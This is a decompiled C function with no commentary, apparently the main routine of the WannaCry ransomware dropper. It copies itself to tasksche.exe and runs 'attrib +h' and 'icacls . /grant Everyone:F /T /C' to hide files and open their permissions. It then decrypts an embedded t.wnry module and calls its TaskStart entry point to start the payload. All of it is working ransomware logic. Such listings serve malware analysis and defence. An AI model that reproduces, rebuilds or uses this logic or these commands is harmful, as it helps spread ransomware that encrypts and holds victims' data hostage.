
undefined4 FUN_00401fe7(void)

{
  bool bVar1;
  int *piVar2;
  undefined3 extraout_var;
  DWORD DVar3;
  char *pcVar4;
  byte *pbVar5;
  code *pcVar6;
  int iVar7;
  undefined4 *puVar8;
  char **_Str2;
  undefined1 local_6e8 [1240];
  CHAR local_210;
  undefined4 local_20f;
  uint local_8;
  
  local_210 = DAT_0040f910;
  puVar8 = &local_20f;
  for (iVar7 = 0x81; iVar7 != 0; iVar7 = iVar7 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  *(undefined2 *)puVar8 = 0;
  *(undefined1 *)((int)puVar8 + 2) = 0;
  GetModuleFileNameA((HMODULE)0x0,&local_210,0x208);
  FUN_00401225(0x40f8ac);
  piVar2 = (int *)__p___argc();
  if (*piVar2 == 2) {
    _Str2 = &_Str2_0040f538;
    piVar2 = (int *)__p___argv();
    iVar7 = strcmp(*(char **)(*piVar2 + 4),(char *)_Str2);
    if ((iVar7 == 0) && (bVar1 = FUN_00401b5f((wchar_t *)0x0), CONCAT31(extraout_var,bVar1) != 0)) {
      CopyFileA(&local_210,s_tasksche.exe_0040f4d8,0);
      DVar3 = GetFileAttributesA(s_tasksche.exe_0040f4d8);
      if ((DVar3 != 0xffffffff) && (iVar7 = FUN_00401f5d(), iVar7 != 0)) {
        return 0;
      }
    }
  }
  pcVar4 = strrchr(&local_210,0x5c);
  if (pcVar4 != (char *)0x0) {
    pcVar4 = strrchr(&local_210,0x5c);
    *pcVar4 = '\0';
  }
  SetCurrentDirectoryA(&local_210);
  FUN_004010fd(1);
  FUN_00401dab((HMODULE)0x0);
  FUN_00401e9e();
  FUN_00401064(s_attrib_+h_._0040f520,0,(LPDWORD)0x0);
  FUN_00401064(s_icacls_._/grant_Everyone:F_/T_/C_0040f4fc,0,(LPDWORD)0x0);
  iVar7 = FUN_0040170a();
  if (iVar7 != 0) {
    FUN_004012fd();
    iVar7 = FUN_00401437(local_6e8,(LPCSTR)0x0,0,0);
    if (iVar7 != 0) {
      local_8 = 0;
      pbVar5 = FUN_004014a6(local_6e8,s_t.wnry_0040f4f4,&local_8);
      if (((pbVar5 != (byte *)0x0) &&
          (piVar2 = (int *)FUN_004021bd((short *)pbVar5,local_8), piVar2 != (int *)0x0)) &&
         (pcVar6 = (code *)FUN_00402924(piVar2,s_TaskStart_0040f4e8), pcVar6 != (code *)0x0)) {
        (*pcVar6)(0,0);
      }
    }
    FUN_0040137a();
  }
  return 0;
}
